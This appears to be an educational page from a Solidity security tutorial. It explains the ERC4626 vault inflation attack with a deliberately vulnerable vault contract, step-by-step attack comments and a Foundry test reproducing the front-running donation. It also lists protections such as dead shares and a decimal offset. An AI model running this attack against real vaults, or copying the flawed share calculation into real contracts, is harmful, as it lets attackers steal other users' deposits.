// metadata
export const version = "0.8.20"
export const title = "Vault Inflation"
export const description = "An example of vault inflation"

export const keywords = ["hack", "security", "inflation", "erc4626", "vault"]

export const codes = [
  {
    fileName: "VaultInflation.sol",
    code: "Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgMC44LjIwOwoKaW1wb3J0IHtUZXN0LCBjb25zb2xlMn0gZnJvbSAiZm9yZ2Utc3RkL1Rlc3Quc29sIjsKCnVpbnQ4IGNvbnN0YW50IERFQ0lNQUxTID0gMTg7CgppbnRlcmZhY2UgSUVSQzIwIHsKICAgIGZ1bmN0aW9uIHRvdGFsU3VwcGx5KCkgZXh0ZXJuYWwgdmlldyByZXR1cm5zICh1aW50MjU2KTsKICAgIGZ1bmN0aW9uIGJhbGFuY2VPZihhZGRyZXNzIGFjY291bnQpIGV4dGVybmFsIHZpZXcgcmV0dXJucyAodWludDI1Nik7CiAgICBmdW5jdGlvbiB0cmFuc2ZlcihhZGRyZXNzIHJlY2lwaWVudCwgdWludDI1NiBhbW91bnQpIGV4dGVybmFsIHJldHVybnMgKGJvb2wpOwogICAgZnVuY3Rpb24gYWxsb3dhbmNlKGFkZHJlc3Mgb3duZXIsIGFkZHJlc3Mgc3BlbmRlcikgZXh0ZXJuYWwgdmlldyByZXR1cm5zICh1aW50MjU2KTsKICAgIGZ1bmN0aW9uIGFwcHJvdmUoYWRkcmVzcyBzcGVuZGVyLCB1aW50MjU2IGFtb3VudCkgZXh0ZXJuYWwgcmV0dXJucyAoYm9vbCk7CiAgICBmdW5jdGlvbiB0cmFuc2ZlckZyb20oYWRkcmVzcyBzZW5kZXIsIGFkZHJlc3MgcmVjaXBpZW50LCB1aW50MjU2IGFtb3VudCkgZXh0ZXJuYWwgcmV0dXJucyAoYm9vbCk7CgogICAgZXZlbnQgVHJhbnNmZXIoYWRkcmVzcyBpbmRleGVkIGZyb20sIGFkZHJlc3MgaW5kZXhlZCB0bywgdWludDI1NiB2YWx1ZSk7CiAgICBldmVudCBBcHByb3ZhbChhZGRyZXNzIGluZGV4ZWQgb3duZXIsIGFkZHJlc3MgaW5kZXhlZCBzcGVuZGVyLCB1aW50MjU2IHZhbHVlKTsKfQoKY29udHJhY3QgVG9rZW4gaXMgSUVSQzIwIHsKICAgIHVpbnQyNTYgcHVibGljIHRvdGFsU3VwcGx5OwogICAgbWFwcGluZyhhZGRyZXNzID0+IHVpbnQyNTYpIHB1YmxpYyBiYWxhbmNlT2Y7CiAgICBtYXBwaW5nKGFkZHJlc3MgPT4gbWFwcGluZyhhZGRyZXNzID0+IHVpbnQyNTYpKSBwdWJsaWMgYWxsb3dhbmNlOwogICAgdWludDggcHVibGljIGRlY2ltYWxzID0gREVDSU1BTFM7CgogICAgZnVuY3Rpb24gdHJhbnNmZXIoYWRkcmVzcyByZWNpcGllbnQsIHVpbnQyNTYgYW1vdW50KSBleHRlcm5hbCByZXR1cm5zIChib29sKSB7CiAgICAgICAgYmFsYW5jZU9mW21zZy5zZW5kZXJdIC09IGFtb3VudDsKICAgICAgICBiYWxhbmNlT2ZbcmVjaXBpZW50XSArPSBhbW91bnQ7CiAgICAgICAgZW1pdCBUcmFuc2Zlcihtc2cuc2VuZGVyLCByZWNpcGllbnQsIGFtb3VudCk7CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CgogICAgZnVuY3Rpb24gYXBwcm92ZShhZGRyZXNzIHNwZW5kZXIsIHVpbnQyNTYgYW1vdW50KSBleHRlcm5hbCByZXR1cm5zIChib29sKSB7CiAgICAgICAgYWxsb3dhbmNlW21zZy5zZW5kZXJdW3NwZW5kZXJdID0gYW1vdW50OwogICAgICAgIGVtaXQgQXBwcm92YWwobXNnLnNlbmRlciwgc3BlbmRlciwgYW1vdW50KTsKICAgICAgICByZXR1cm4gdHJ1ZTsKICAgIH0KCiAgICBmdW5jdGlvbiB0cmFuc2ZlckZyb20oYWRkcmVzcyBzZW5kZXIsIGFkZHJlc3MgcmVjaXBpZW50LCB1aW50MjU2IGFtb3VudCkgZXh0ZXJuYWwgcmV0dXJucyAoYm9vbCkgewogICAgICAgIGFsbG93YW5jZVtzZW5kZXJdW21zZy5zZW5kZXJdIC09IGFtb3VudDsKICAgICAgICBiYWxhbmNlT2Zbc2VuZGVyXSAtPSBhbW91bnQ7CiAgICAgICAgYmFsYW5jZU9mW3JlY2lwaWVudF0gKz0gYW1vdW50OwogICAgICAgIGVtaXQgVHJhbnNmZXIoc2VuZGVyLCByZWNpcGllbnQsIGFtb3VudCk7CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CgogICAgZnVuY3Rpb24gbWludChhZGRyZXNzIGRzdCwgdWludDI1NiBhbW91bnQpIGV4dGVybmFsIHsKICAgICAgICBiYWxhbmNlT2ZbZHN0XSArPSBhbW91bnQ7CiAgICAgICAgdG90YWxTdXBwbHkgKz0gYW1vdW50OwogICAgICAgIGVtaXQgVHJhbnNmZXIoYWRkcmVzcygwKSwgZHN0LCBhbW91bnQpOwogICAgfQoKICAgIGZ1bmN0aW9uIGJ1cm4odWludDI1NiBhbW91bnQpIGV4dGVybmFsIHsKICAgICAgICBiYWxhbmNlT2ZbbXNnLnNlbmRlcl0gLT0gYW1vdW50OwogICAgICAgIHRvdGFsU3VwcGx5IC09IGFtb3VudDsKICAgICAgICBlbWl0IFRyYW5zZmVyKG1zZy5zZW5kZXIsIGFkZHJlc3MoMCksIGFtb3VudCk7CiAgICB9Cn0KCmNvbnRyYWN0IFZhdWx0IHsKICAgIElFUkMyMCBwdWJsaWMgaW1tdXRhYmxlIHRva2VuOwoKICAgIHVpbnQyNTYgcHVibGljIHRvdGFsU3VwcGx5OwogICAgbWFwcGluZyhhZGRyZXNzID0+IHVpbnQyNTYpIHB1YmxpYyBiYWxhbmNlT2Y7CgogICAgY29uc3RydWN0b3IoYWRkcmVzcyBfdG9rZW4pIHsKICAgICAgICB0b2tlbiA9IElFUkMyMChfdG9rZW4pOwogICAgfQoKICAgIGZ1bmN0aW9uIF9taW50KGFkZHJlc3MgX3RvLCB1aW50MjU2IF9zaGFyZXMpIHByaXZhdGUgewogICAgICAgIHRvdGFsU3VwcGx5ICs9IF9zaGFyZXM7CiAgICAgICAgYmFsYW5jZU9mW190b10gKz0gX3NoYXJlczsKICAgIH0KCiAgICBmdW5jdGlvbiBfYnVybihhZGRyZXNzIF9mcm9tLCB1aW50MjU2IF9zaGFyZXMpIHByaXZhdGUgewogICAgICAgIHRvdGFsU3VwcGx5IC09IF9zaGFyZXM7CiAgICAgICAgYmFsYW5jZU9mW19mcm9tXSAtPSBfc2hhcmVzOwogICAgfQoKICAgIC8vIEluZmxhdGlvbiBhdHRhY2sgLy8KICAgIC8vIDEuIFVzZXIgMCBkZXBvc2l0cyAxCiAgICAvLyAyLiBVc2VyIDAgZG9uYXRlcyAxMDAgKiAxZTE4CiAgICAvLyAzLiBVc2VyIDEgZGVwb3NpdHMgMTAwICogMWUxOCAtPiAwIHNoYXJlcyBtaW50ZWQKICAgIC8vIDQuIFVzZXIgMCB3aXRoZHJhd3MgMjAwICogMWUxOCArIDEKICAgIC8vCiAgICAvLyB1c2VyIDEgc2hhcmVzID0gMTAwICogMWUxOCAqIDEgLyAoMTAwICogMWUxOCArIDEpCiAgICAvLyAgICAgICAgICAgICAgID0gMAogICAgLy8KICAgIC8vICAgIHwgYmFsYW5jZSAgICAgICAgfCB1c2VyIDAgc2hhcmVzIHwgdXNlciAxIHNoYXJlcyB8IHRvdGFsIHN1cHBseSB8CiAgICAvLyAxLiB8ICAgICAgICAgICAgICAxIHwgICAgICAgICAgICAgMSB8ICAgICAgICAgICAgIDAgfCAgICAgICAgICAgIDEgfAogICAgLy8gMi4gfCAxMDAgKiAxZTE4ICsgMSB8ICAgICAgICAgICAgIDEgfCAgICAgICAgICAgICAwIHwgICAgICAgICAgICAxIHwKICAgIC8vIDMuIHwgMjAwICogMWUxOCArIDEgfCAgICAgICAgICAgICAxIHwgICAgICAgICAgICAgMCB8ICAgICAgICAgICAgMSB8CiAgICAvLyA0LiB8ICAgICAgICAgICAgICAwIHwgICAgICAgICAgICAgMCB8ICAgICAgICAgICAgIDAgfCAgICAgICAgICAgIDAgfAoKICAgIGZ1bmN0aW9uIGRlcG9zaXQodWludDI1NiBhbW91bnQpIGV4dGVybmFsIHsKICAgICAgICB1aW50MjU2IHNoYXJlczsKICAgICAgICBpZiAodG90YWxTdXBwbHkgPT0gMCkgewogICAgICAgICAgICBzaGFyZXMgPSBhbW91bnQ7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgc2hhcmVzID0gKGFtb3VudCAqIHRvdGFsU3VwcGx5KSAvIHRva2VuLmJhbGFuY2VPZihhZGRyZXNzKHRoaXMpKTsKICAgICAgICB9CgogICAgICAgIF9taW50KG1zZy5zZW5kZXIsIHNoYXJlcyk7CiAgICAgICAgdG9rZW4udHJhbnNmZXJGcm9tKG1zZy5zZW5kZXIsIGFkZHJlc3ModGhpcyksIGFtb3VudCk7CiAgICB9CgogICAgZnVuY3Rpb24gd2l0aGRyYXcodWludDI1NiBzaGFyZXMpIGV4dGVybmFsIHJldHVybnMgKHVpbnQyNTYpIHsKICAgICAgICB1aW50MjU2IGFtb3VudCA9IChzaGFyZXMgKiB0b2tlbi5iYWxhbmNlT2YoYWRkcmVzcyh0aGlzKSkpIC8gdG90YWxTdXBwbHk7CiAgICAgICAgX2J1cm4obXNnLnNlbmRlciwgc2hhcmVzKTsKICAgICAgICB0b2tlbi50cmFuc2Zlcihtc2cuc2VuZGVyLCBhbW91bnQpOwogICAgICAgIHJldHVybiBhbW91bnQ7CiAgICB9CgogICAgZnVuY3Rpb24gcHJldmlld1JlZGVlbSh1aW50MjU2IHNoYXJlcykgZXh0ZXJuYWwgcmV0dXJucyAodWludDI1NikgewogICAgICAgIGlmICh0b3RhbFN1cHBseSA9PSAwKSB7CiAgICAgICAgICAgIHJldHVybiAwOwogICAgICAgIH0KICAgICAgICByZXR1cm4gKHNoYXJlcyAqIHRva2VuLmJhbGFuY2VPZihhZGRyZXNzKHRoaXMpKSkgLyB0b3RhbFN1cHBseTsKICAgIH0KfQoKLy8gZm9yZ2UgdGVzdCAtdnZ2IC0tbWF0Y2gtcGF0aCBWYXVsdC50ZXN0LnNvbApjb250cmFjdCBWYXVsdFRlc3QgaXMgVGVzdCB7CiAgICBWYXVsdCBwcml2YXRlIHZhdWx0OwogICAgVG9rZW4gcHJpdmF0ZSB0b2tlbjsKCiAgICBhZGRyZXNzW10gcHJpdmF0ZSB1c2VycyA9IFthZGRyZXNzKDExKSwgYWRkcmVzcygxMildOwoKICAgIGZ1bmN0aW9uIHNldFVwKCkgcHVibGljIHsKICAgICAgICB0b2tlbiA9IG5ldyBUb2tlbigpOwogICAgICAgIHZhdWx0ID0gbmV3IFZhdWx0KGFkZHJlc3ModG9rZW4pKTsKCiAgICAgICAgZm9yICh1aW50MjU2IGkgPSAwOyBpIDwgdXNlcnMubGVuZ3RoOyBpKyspIHsKICAgICAgICAgICAgdG9rZW4ubWludCh1c2Vyc1tpXSwgMTAwMDAgKiAoMTAgKiogREVDSU1BTFMpKTsKICAgICAgICAgICAgdm0ucHJhbmsodXNlcnNbaV0pOwogICAgICAgICAgICB0b2tlbi5hcHByb3ZlKGFkZHJlc3ModmF1bHQpLCB0eXBlKHVpbnQyNTYpLm1heCk7CiAgICAgICAgfQogICAgfQoKICAgIGZ1bmN0aW9uIHByaW50KCkgcHJpdmF0ZSB7CiAgICAgICAgY29uc29sZTIubG9nKCJ2YXVsdCB0b3RhbCBzdXBwbHkiLCB2YXVsdC50b3RhbFN1cHBseSgpKTsKICAgICAgICBjb25zb2xlMi5sb2coInZhdWx0IGJhbGFuY2UiLCB0b2tlbi5iYWxhbmNlT2YoYWRkcmVzcyh2YXVsdCkpKTsKICAgICAgICB1aW50MjU2IHNoYXJlczAgPSB2YXVsdC5iYWxhbmNlT2YodXNlcnNbMF0pOwogICAgICAgIHVpbnQyNTYgc2hhcmVzMSA9IHZhdWx0LmJhbGFuY2VPZih1c2Vyc1sxXSk7CiAgICAgICAgY29uc29sZTIubG9nKCJ1c2Vyc1swXSBzaGFyZXMiLCBzaGFyZXMwKTsKICAgICAgICBjb25zb2xlMi5sb2coInVzZXJzWzFdIHNoYXJlcyIsIHNoYXJlczEpOwogICAgICAgIGNvbnNvbGUyLmxvZygidXNlcnNbMF0gcmVkZWVtYWJsZSIsIHZhdWx0LnByZXZpZXdSZWRlZW0oc2hhcmVzMCkpOwogICAgICAgIGNvbnNvbGUyLmxvZygidXNlcnNbMV0gcmVkZWVtYWJsZSIsIHZhdWx0LnByZXZpZXdSZWRlZW0oc2hhcmVzMSkpOwogICAgfQoKICAgIGZ1bmN0aW9uIHRlc3QoKSBwdWJsaWMgewogICAgICAgIC8vIHVzZXJzWzBdIGRlcG9zaXQgMQogICAgICAgIGNvbnNvbGUyLmxvZygiLS0tIHVzZXJzWzBdIGRlcG9zaXQgLS0tIik7CiAgICAgICAgdm0ucHJhbmsodXNlcnNbMF0pOwogICAgICAgIHZhdWx0LmRlcG9zaXQoMSk7CiAgICAgICAgcHJpbnQoKTsKCiAgICAgICAgLy8gdXNlcnNbMF0gZG9uYXRlIDEwMAogICAgICAgIGNvbnNvbGUyLmxvZygiLS0tIHVzZXJzWzBdIGRvbmF0ZSAtLS0iKTsKICAgICAgICB2bS5wcmFuayh1c2Vyc1swXSk7CiAgICAgICAgdG9rZW4udHJhbnNmZXIoYWRkcmVzcyh2YXVsdCksIDEwMCAqICgxMCAqKiBERUNJTUFMUykpOwogICAgICAgIHByaW50KCk7CgogICAgICAgIC8vIHVzZXJzWzFdIGRlcG9zaXQgMTAwCiAgICAgICAgY29uc29sZTIubG9nKCItLS0gdXNlcnNbMV0gZGVwb3NpdCAtLS0iKTsKICAgICAgICB2bS5wcmFuayh1c2Vyc1sxXSk7CiAgICAgICAgdmF1bHQuZGVwb3NpdCgxMDAgKiAoMTAgKiogREVDSU1BTFMpKTsKICAgICAgICBwcmludCgpOwogICAgfQp9",
  },
]

const html = `<h3>Vulnerability</h3>
<p>Vault shares can be inflated by donating ERC20 token to the vault.</p>
<p>Attacker can exploit this behavior to steal other user&#39;s deposits.</p>
<h3>Example</h3>
<p>User 0 front runs user 1&#39;s deposit.</p>
<ol>
<li>User 0 deposits <code>1</code>.</li>
<li>User 0 donates <code>100 * 1e18</code>. This inflates the value of each share.</li>
<li>User 1 deposits <code>100 * 1e18</code>. This mints 0 shares to user 1.</li>
<li>User 0 withdraws all <code>200 * 1e18 + 1</code>.</li>
</ol>
<h3>Protections</h3>
<ul>
<li>Min shares -&gt; protects from front running</li>
<li>Internal balance -&gt; protects from donation</li>
<li>Dead shares -&gt; contract is first depositor</li>
<li>Decimal offset (OpenZeppelin ERC4626)</li>
</ul>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> 0.8.20;</span>

<span class="hljs-keyword">import</span> {<span class="hljs-title">Test</span>, <span class="hljs-title">console2</span>} <span class="hljs-title"><span class="hljs-keyword">from</span></span> <span class="hljs-string">"forge-std/Test.sol"</span>;

<span class="hljs-keyword">uint8</span> <span class="hljs-keyword">constant</span> DECIMALS <span class="hljs-operator">=</span> <span class="hljs-number">18</span>;

<span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">IERC20</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">totalSupply</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint256</span></span>)</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">balanceOf</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> account</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint256</span></span>)</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">transfer</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> recipient, <span class="hljs-keyword">uint256</span> amount</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>)</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">allowance</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> owner, <span class="hljs-keyword">address</span> spender</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint256</span></span>)</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">approve</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> spender, <span class="hljs-keyword">uint256</span> amount</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>)</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">transferFrom</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> sender, <span class="hljs-keyword">address</span> recipient, <span class="hljs-keyword">uint256</span> amount</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>)</span>;

    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">Transfer</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">indexed</span> <span class="hljs-keyword">from</span>, <span class="hljs-keyword">address</span> <span class="hljs-keyword">indexed</span> to, <span class="hljs-keyword">uint256</span> value</span>)</span>;
    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">Approval</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">indexed</span> owner, <span class="hljs-keyword">address</span> <span class="hljs-keyword">indexed</span> spender, <span class="hljs-keyword">uint256</span> value</span>)</span>;
}

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Token</span> <span class="hljs-keyword">is</span> <span class="hljs-title">IERC20</span> </span>{
    <span class="hljs-keyword">uint256</span> <span class="hljs-keyword">public</span> totalSupply;
    <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">uint256</span>) <span class="hljs-keyword">public</span> balanceOf;
    <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">uint256</span>)) <span class="hljs-keyword">public</span> allowance;
    <span class="hljs-keyword">uint8</span> <span class="hljs-keyword">public</span> decimals <span class="hljs-operator">=</span> DECIMALS;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">transfer</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> recipient, <span class="hljs-keyword">uint256</span> amount</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>) </span>{
        balanceOf[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] <span class="hljs-operator">-</span><span class="hljs-operator">=</span> amount;
        balanceOf[recipient] <span class="hljs-operator">+</span><span class="hljs-operator">=</span> amount;
        <span class="hljs-keyword">emit</span> Transfer(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, recipient, amount);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">approve</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> spender, <span class="hljs-keyword">uint256</span> amount</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>) </span>{
        allowance[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>][spender] <span class="hljs-operator">=</span> amount;
        <span class="hljs-keyword">emit</span> Approval(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, spender, amount);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">transferFrom</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> sender, <span class="hljs-keyword">address</span> recipient, <span class="hljs-keyword">uint256</span> amount</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>) </span>{
        allowance[sender][<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] <span class="hljs-operator">-</span><span class="hljs-operator">=</span> amount;
        balanceOf[sender] <span class="hljs-operator">-</span><span class="hljs-operator">=</span> amount;
        balanceOf[recipient] <span class="hljs-operator">+</span><span class="hljs-operator">=</span> amount;
        <span class="hljs-keyword">emit</span> Transfer(sender, recipient, amount);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">mint</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> dst, <span class="hljs-keyword">uint256</span> amount</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> </span>{
        balanceOf[dst] <span class="hljs-operator">+</span><span class="hljs-operator">=</span> amount;
        totalSupply <span class="hljs-operator">+</span><span class="hljs-operator">=</span> amount;
        <span class="hljs-keyword">emit</span> Transfer(<span class="hljs-keyword">address</span>(<span class="hljs-number">0</span>), dst, amount);
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">burn</span>(<span class="hljs-params"><span class="hljs-keyword">uint256</span> amount</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> </span>{
        balanceOf[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] <span class="hljs-operator">-</span><span class="hljs-operator">=</span> amount;
        totalSupply <span class="hljs-operator">-</span><span class="hljs-operator">=</span> amount;
        <span class="hljs-keyword">emit</span> Transfer(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, <span class="hljs-keyword">address</span>(<span class="hljs-number">0</span>), amount);
    }
}

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Vault</span> </span>{
    IERC20 <span class="hljs-keyword">public</span> <span class="hljs-keyword">immutable</span> token;

    <span class="hljs-keyword">uint256</span> <span class="hljs-keyword">public</span> totalSupply;
    <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">uint256</span>) <span class="hljs-keyword">public</span> balanceOf;

    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _token</span>) </span>{
        token <span class="hljs-operator">=</span> IERC20(_token);
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_mint</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _to, <span class="hljs-keyword">uint256</span> _shares</span>) <span class="hljs-title"><span class="hljs-keyword">private</span></span> </span>{
        totalSupply <span class="hljs-operator">+</span><span class="hljs-operator">=</span> _shares;
        balanceOf[_to] <span class="hljs-operator">+</span><span class="hljs-operator">=</span> _shares;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_burn</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _from, <span class="hljs-keyword">uint256</span> _shares</span>) <span class="hljs-title"><span class="hljs-keyword">private</span></span> </span>{
        totalSupply <span class="hljs-operator">-</span><span class="hljs-operator">=</span> _shares;
        balanceOf[_from] <span class="hljs-operator">-</span><span class="hljs-operator">=</span> _shares;
    }

    <span class="hljs-comment">// Inflation attack //</span>
    <span class="hljs-comment">// 1. User 0 deposits 1</span>
    <span class="hljs-comment">// 2. User 0 donates 100 * 1e18</span>
    <span class="hljs-comment">// 3. User 1 deposits 100 * 1e18 -&gt; 0 shares minted</span>
    <span class="hljs-comment">// 4. User 0 withdraws 200 * 1e18 + 1</span>
    <span class="hljs-comment">//</span>
    <span class="hljs-comment">// user 1 shares = 100 * 1e18 * 1 / (100 * 1e18 + 1)</span>
    <span class="hljs-comment">//               = 0</span>
    <span class="hljs-comment">//</span>
    <span class="hljs-comment">//    | balance        | user 0 shares | user 1 shares | total supply |</span>
    <span class="hljs-comment">// 1. |              1 |             1 |             0 |            1 |</span>
    <span class="hljs-comment">// 2. | 100 * 1e18 + 1 |             1 |             0 |            1 |</span>
    <span class="hljs-comment">// 3. | 200 * 1e18 + 1 |             1 |             0 |            1 |</span>
    <span class="hljs-comment">// 4. |              0 |             0 |             0 |            0 |</span>

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deposit</span>(<span class="hljs-params"><span class="hljs-keyword">uint256</span> amount</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> </span>{
        <span class="hljs-keyword">uint256</span> shares;
        <span class="hljs-keyword">if</span> (totalSupply <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-number">0</span>) {
            shares <span class="hljs-operator">=</span> amount;
        } <span class="hljs-keyword">else</span> {
            shares <span class="hljs-operator">=</span> (amount <span class="hljs-operator">*</span> totalSupply) <span class="hljs-operator">/</span> token.balanceOf(<span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>));
        }

        _mint(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, shares);
        token.transferFrom(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>), amount);
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params"><span class="hljs-keyword">uint256</span> shares</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint256</span></span>) </span>{
        <span class="hljs-keyword">uint256</span> amount <span class="hljs-operator">=</span> (shares <span class="hljs-operator">*</span> token.balanceOf(<span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>))) <span class="hljs-operator">/</span> totalSupply;
        _burn(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, shares);
        token.<span class="hljs-built_in">transfer</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, amount);
        <span class="hljs-keyword">return</span> amount;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">previewRedeem</span>(<span class="hljs-params"><span class="hljs-keyword">uint256</span> shares</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint256</span></span>) </span>{
        <span class="hljs-keyword">if</span> (totalSupply <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
        }
        <span class="hljs-keyword">return</span> (shares <span class="hljs-operator">*</span> token.balanceOf(<span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>))) <span class="hljs-operator">/</span> totalSupply;
    }
}

<span class="hljs-comment">// forge test -vvv --match-path Vault.test.sol</span>
<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">VaultTest</span> <span class="hljs-keyword">is</span> <span class="hljs-title">Test</span> </span>{
    Vault <span class="hljs-keyword">private</span> vault;
    Token <span class="hljs-keyword">private</span> token;

    <span class="hljs-keyword">address</span>[] <span class="hljs-keyword">private</span> users <span class="hljs-operator">=</span> [<span class="hljs-keyword">address</span>(<span class="hljs-number">11</span>), <span class="hljs-keyword">address</span>(<span class="hljs-number">12</span>)];

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setUp</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        token <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> Token();
        vault <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> Vault(<span class="hljs-keyword">address</span>(token));

        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">uint256</span> i <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i <span class="hljs-operator">&lt;</span> users.<span class="hljs-built_in">length</span>; i<span class="hljs-operator">+</span><span class="hljs-operator">+</span>) {
            token.mint(users[i], <span class="hljs-number">10000</span> <span class="hljs-operator">*</span> (<span class="hljs-number">10</span> <span class="hljs-operator">*</span><span class="hljs-operator">*</span> DECIMALS));
            vm.prank(users[i]);
            token.approve(<span class="hljs-keyword">address</span>(vault), <span class="hljs-keyword">type</span>(<span class="hljs-keyword">uint256</span>).<span class="hljs-built_in">max</span>);
        }
    }

